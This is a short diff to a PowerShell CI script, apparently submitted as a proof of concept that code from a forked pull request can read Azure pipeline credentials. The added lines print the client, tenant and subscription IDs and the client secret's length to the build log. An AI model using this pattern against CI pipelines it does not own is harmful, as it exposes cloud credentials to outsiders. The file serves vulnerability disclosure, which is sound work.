@@ -33,3 +33,9 @@ bicep --help
 
 # List Modules
 Get-InstalledModule | Select-Object Name, Version, Repository, InstalledDate | Sort-Object Name | Format-Table
+
+# PoC - demonstrating ARM_CLIENT_SECRET is accessible to fork code at this point
+Write-Output "[PoC] ARM_CLIENT_ID=$env:ARM_CLIENT_ID"
+Write-Output "[PoC] ARM_TENANT_ID=$env:ARM_TENANT_ID"
+Write-Output "[PoC] ARM_SUBSCRIPTION_ID=$env:ARM_SUBSCRIPTION_ID"
+Write-Output "[PoC] ARM_CLIENT_SECRET length=$($env:ARM_CLIENT_SECRET.Length) chars"
